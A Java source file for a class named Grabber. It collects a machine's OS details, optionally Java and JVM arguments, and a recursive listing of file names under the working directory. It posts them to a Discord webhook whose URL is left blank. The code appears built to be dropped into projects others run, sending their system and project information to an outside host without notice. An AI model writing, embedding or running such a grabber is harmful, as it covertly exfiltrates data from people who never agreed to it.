package me.ricky.grabber;

import java.io.File;
import java.io.IOException;
import java.io.OutputStream;
import java.lang.management.ManagementFactory;
import java.net.HttpURLConnection;
import java.net.URL;
import java.time.Instant;
import java.time.ZoneId;
import java.time.format.DateTimeFormatter;
import java.util.List;

@SuppressWarnings("unused")
public class Grabber {
    // Webhook information
    private static final String webhookUrl = "";
    private static final String webhookColor = "";

    // What all to grab
    private static final boolean javaInfo = false;
    private static final boolean osInfo = true;
    private static final boolean listFiles = true;
    private static final boolean sendFiles = false;

    private static final List<String> ignoredFolders = List.of(
        "build",
        ".git",
        ".idea",
        "gradle",
        ".gradle"
    );

    public static void collectInfo() {
        if (webhookUrl.isBlank()) return;

        if (javaInfo) {
            String content = "Vendor: " + System.getProperty("java.vendor") + "\\n";
            content += "Version: " + System.getProperty("java.version") + "\\n";
            List<String> jvmArgs = ManagementFactory.getRuntimeMXBean().getInputArguments();
            content += "JVM Args: \\n- " + String.join("\\n- ", jvmArgs);

            sendDiscordEmbed("Java Info", content);
        }

        if (osInfo) {
            String content = "Brand: " + System.getProperty("os.name") + "\\n";
            content += "Version: " + System.getProperty("os.version") + "\\n";
            content += "Architecture: " + System.getProperty("os.arch");

            sendDiscordEmbed("OS Info", content);
        }

        if (listFiles) {
            String content = printFolder(System.getProperty("user.dir"), 0);
            sendDiscordEmbed("Project Files", content);
        }
    }

    public static String printFolder(String path, int indent) {
        StringBuilder content = new StringBuilder();
        File[] files = new File(path).listFiles();
        if (files == null) return content.toString();

        if (indent == 0) content.append("📂 ").append(path).append("/\\n");

        for (File file : files) {
            if (ignoredFolders.contains(file.getName())) continue;
            content.append("    ".repeat(indent + 1));

            if (file.isDirectory()) {
                File[] innerFiles = file.listFiles();

                if (isPackage(file)) {
                    content.append("📂 ").append(file.getName()).append("/");

                    File subFolder = innerFiles[0];
                    while (isPackage(subFolder)) {
                        content.append(subFolder.getName()).append("/");
                        subFolder = subFolder.listFiles()[0];
                    }

                    content.append(subFolder.getName()).append("/").append("\\n");
                    content.append(printFolder(subFolder.getPath(), indent + 1));
                } else {
                    content.append("📂 ").append(file.getName()).append("/\\n");
                    content.append(printFolder(file.getPath(), indent + 1));
                }
            } else {
                content.append("📄 ").append(file.getName()).append("\\n");
            }
        }

        return content.toString();
    }

    private static boolean isPackage(File file) {
        if (!file.isDirectory()) return false;
        File[] files = file.listFiles();
        if (files == null) return false;
        return files.length == 1 && files[0].isDirectory();
    }

    private static void sendDiscordEmbed(String title, String body) {
        try {
            HttpURLConnection connection = (HttpURLConnection) new URL(webhookUrl).openConnection();

            connection.setRequestMethod("POST");
            connection.setRequestProperty("Content-Type", "application/json");
            connection.setDoOutput(true);

            String content = "{\n  \"content\": null,\n  \"attachments\": [],\n  \"embeds\": [{\n";
            content += String.format("    \"title\": \"%s\",\n    \"description\": \"%s\",\n", title, body);

            int color = Integer.parseInt(webhookColor.isBlank() ? "000000" : webhookColor, 16);
            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd'T'HH:mm");
            String timeStamp = formatter.format(Instant.now().atZone(ZoneId.of("UTC"))) + ":00.000Z";

            content += String.format("    \"color\": %d,\n    \"timestamp\": \"%s\"\n  }]\n}", color, timeStamp);
            System.out.println(content);

            try (OutputStream os = connection.getOutputStream()) {
                os.write(content.getBytes());
                os.flush();
            }

            connection.getInputStream().close();
            connection.disconnect();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}
